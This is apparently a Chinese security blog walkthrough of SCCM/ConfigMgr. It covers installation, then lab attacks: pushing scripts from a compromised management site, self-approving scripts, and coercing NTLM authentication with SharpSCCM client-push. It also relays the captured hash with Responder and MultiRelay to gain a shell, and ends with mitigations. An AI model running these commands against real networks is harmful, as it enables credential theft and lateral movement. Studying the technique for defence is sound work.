## **01** SCCM介绍

SCCM全名为System Center Configuration Manager，从版本1910开始，微软官方将其从Microsoft System
Center产品移除，重新命名为Microsoft Endpoint Configuration Manager（ConfigMgr），其可帮助 IT
部门管理电脑和服务器，保持软件的最新状态，设置配置和安全策略，并监控系统状态，同时让员工能够访问所选设备上的公司应用程序。

##  **02** SCCM安装

SCCM下载：https://www.microsoft.com/zh-cn/evalcenter/evaluate-microsoft-endpoint-configuration-manager

SCCM安装先决条件

  * SQLSERVER2012以上

  * 必须为域内服务器主机，SQLSERVER服务必须使用域内账户管理（普通域用户）

  * Windows ADK安装：https://docs.microsoft.com/zh-cn/windows-hardware/getstarted/adk-install#other-adk-downloads

  * 需修改SQLSERVER实例排序规则为SQL_Latin1_General_CP1_CI_AS，修改方法如下

    
    
    暂停SQLSERVER服务  
    cd C:\Program Files\Microsoft SQL Server\110\Setup Bootstrap\SQLServer2012  
    Setup /QUIET /ACTION=REBUILDDATABASE /instancename=mssqlserver /SQLSYSADMINACCOUNTS=PENT  
    EST\administrator /sapwd= /sqlcollation=SQL_Latin1_General_CP1_CI_AS  
    重启SQLSERVER服务

  * 15G以上的存储空间

  * 服务器需要安装Remote Differential Compression服务

##  **03** SCCM攻击利用

对于SCCM攻击利用首先查看目标环境是否存在，可以从目标机器中查看是否存在CcmExec.exe程序和ConfigMgr任务序列代理服务，如果存在即目标机器为SCCM的客户端机器，目标环境存在SCCM管理站点。

![1667379287_6362305716b35fc55b03b.png!small?1667379287839](https://image.3001.net/images/20221102/1667379287_6362305716b35fc55b03b.png!small?1667379287839)

 **通过使用SCCM推送恶意文件**

利用SCCM软件分发功能，如果攻击者控制了管理站点就可以向客户端进行‘软件分发推送恶意文件。

从软件库中创建powershell脚本执行calc.exe。

![1667379311_6362306f1887e24114501.png!small?1667379311608](https://image.3001.net/images/20221102/1667379311_6362306f1887e24114501.png!small?1667379311608)

创建如下，审批状态是已批准，只有已批准的软件或者脚本才可以下发客户端使用。

![1667379331_63623083aa9626b1265ad.png!small?1667379332344](https://image.3001.net/images/20221102/1667379331_63623083aa9626b1265ad.png!small?1667379332344)

默认情况下脚本创建作者是不可以审批自己的脚本，如果获取的是平台的完全权限管理员是可以从站点配置中进行修改，使自己审批自己创建的脚本。

![1667379423_636230dfeffbad7ff34bb.png!small?1667379424724](https://image.3001.net/images/20221102/1667379423_636230dfeffbad7ff34bb.png!small?1667379424724)

通过在站点处层次结构设置中进行修改，取消勾选脚本编写者需要其他脚本审批者，这时在站点中就可以自己批准自己脚本。

![1667379435_636230eb7776ec7542efb.png!small?1667379436134](https://image.3001.net/images/20221102/1667379435_636230eb7776ec7542efb.png!small?1667379436134)

通过客户端进行下发成功执行powershell脚本，在客户端机器中执行win32calc.exe。

![1667381109_63623775921a176407a4c.png!small?1667381110347](https://image.3001.net/images/20221102/1667381109_63623775921a176407a4c.png!small?1667381110347)

 **通过SCCM强制进行NTLM认证**

在客户端机器中使用SharpSCCM查询本地站点信息

    
    
    SharpSCCM.exe local siteinfo

![1667381310_6362383e32c5863ab572c.png!small?1667381310584](https://image.3001.net/images/20221102/1667381310_6362383e32c5863ab572c.png!small?1667381310584)

MSSQL.pentest.com是管理站点地址，XOR是站点代码。

其原理是从wmi命名空间root\ccm去查询客户端注册相关信息，我们可以通过系统提供wbemtest(https://docs.microsoft.com/en-us/mem/configmgr/develop/core/understand/introduction-to-wbemtest)连接命名空间root\ccm枚举其中的类。

![1667381338_6362385a4c87d54c29684.png!small?1667381350234](https://image.3001.net/images/20221102/1667381338_6362385a4c87d54c29684.png!small?1667381350234)

通过配置我们知道在环境中SCCM要对某个机器下发客户端安装需要通过WMI远程管理，使用配置的账户连接到目标主机的ADMIN$共享，这个配置账号必定是本地管理员组或者是Domain
Admins组用户才能在工作组或域环境中对目标机器进行连接下发安装。就如下图，在站点MSSQL.pentest.com中客户端安装设置中的客户端请求安装属性账户必须是目标计算机上本地管理员组成员。

![1667381353_636238699336f39a705f3.png!small?1667381354470](https://image.3001.net/images/20221102/1667381353_636238699336f39a705f3.png!small?1667381354470)

知道了上面这点，围绕获取这个配置账户的权限又有了如下攻击利用方式，SharpSCCM作者Mayyhem发现当SCCM启用自动站点分配和自动客户端推送安装，并且客户端身份验证不需要PKI证书时，可以将NTLM身份验证从管理点的安装和计算机账户强制转换为任意NetBIOS名称、FQDN或IP地址，允许凭据转发或破解，并且可以在任何Windows
SCCM客户端上的低权限用户来完成。

也就是说通过SCCM进行强制NTLM验证有以下四个条件：

  * 必须启用边界组的自动站点分配、自动站点范围客户端请求安装和允许连接回退到NTLM(默认开启的)

客户端推送安装属性设置：

![1667381417_636238a99cf40457337fb.png!small?1667381418333](https://image.3001.net/images/20221102/1667381417_636238a99cf40457337fb.png!small?1667381418333)

建立边界组并勾选将此边界组用于站点分配：

![1667381439_636238bfceb00aa749f3d.png!small?1667381440892](https://image.3001.net/images/20221102/1667381439_636238bfceb00aa749f3d.png!small?1667381440892)

  * 目标管理点必须能够通过445端口上的SMB访问或者启用WebClient通过任何端口的HTTP访问

  * PKI证书不能要求客户端对管理点进行身份验证，才能以低权限用户身份执行此攻击

通信安全设置：

![1667381481_636238e9342ecc3ee779a.png!small?1667381481834](https://image.3001.net/images/20221102/1667381481_636238e9342ecc3ee779a.png!small?1667381481834)

  * 目标机器上没有SCCM客户端存留

SharpSCCM使用SCCM客户端附带客户端消息传递SDK向管理点发送新设备注册请求，表明客户端未安装在指定的NetBIOS名称、FQDN或IP地址上，如果满足上述四个条件，管理站点将启动客户端推送安装，并使用配置账户与目标机器连接。

![1667381495_636238f7578f4a8529db4.png!small?1667381495960](https://image.3001.net/images/20221102/1667381495_636238f7578f4a8529db4.png!small?1667381495960)

SharpSCCM使用推送命令如下，在站点中创建192.168.245.151机器：

    
    
    SharpSCCM.exe MSSQL.pentest.com XOR invoke client-push -t 192.168.245.151

![1667381511_63623907b3055bd094ae7.png!small?1667381512225](https://image.3001.net/images/20221102/1667381511_63623907b3055bd094ae7.png!small?1667381512225)

  

此时在管理站点中就会发现创建了192.168.245.151机器

![1667381525_636239159880b66a76faa.png!small?1667381526145](https://image.3001.net/images/20221102/1667381525_636239159880b66a76faa.png!small?1667381526145)

在151这台机器中使用responder(在配置文件中关闭SMB和HTTP接收开关)和MultiRelay设置中继服务器，并中继到133这台机器上

smb中继条件: SMB签名是关闭的

    
    
    python MultiRelay.py -t 192.168.245.133 -u ALL  
    responder -I eth0 -rPv

![1667381535_6362391f35b5b58b88d08.png!small?1667381536128](https://image.3001.net/images/20221102/1667381535_6362391f35b5b58b88d08.png!small?1667381536128)

在使用SharpSCCM推送安装后151主机接收到NTLMv2 hash并中继给了133主机，133主机接收到中继的PENTEST\secadmin
NTLMv2 hash后弹回shell

![1667381542_63623926673d1c1ea24d4.png!small?1667381543332](https://image.3001.net/images/20221102/1667381542_63623926673d1c1ea24d4.png!small?1667381543332)

如何防止SCCM强制进行NTLM认证这种攻击：

  * 禁用“允许连接回退到NTLM”客户端推送安装设置

  * 使用基于软件更新的客户端安装(https://docs.microsoft.com/en-us/mem/configmgr/core/clients/deploy/deploy-clients-to-windows-computers)，而不是自动全站点客户端推送安装

  * 需要SMB签名，以防止中继凭据被用于向其他系统进行身份验证

  * 切勿使用高权限组的成员（域管理员）进行客户端推送安装，相反为此专门为每个站点创建一个没有交互式登录权限的账户，并将其添加到本地管理员组，做到对此账户的监控

  * 有条件的情况下设置PKI证书进行客户端的身份验证

参考

https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a

https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9

https://github.com/Mayyhem/SharpSCCM/blob/main/SharpSCCM%20%20BHUSA%2BDefcon%202022.pptx

https://blog.xpnsec.com/unobfuscating-network-access-accounts/

https://www.likecs.com/show-204591054.html

https://docs.microsoft.com/en-us/mem/configmgr/

https://www.reddit.com/r/SCCM/

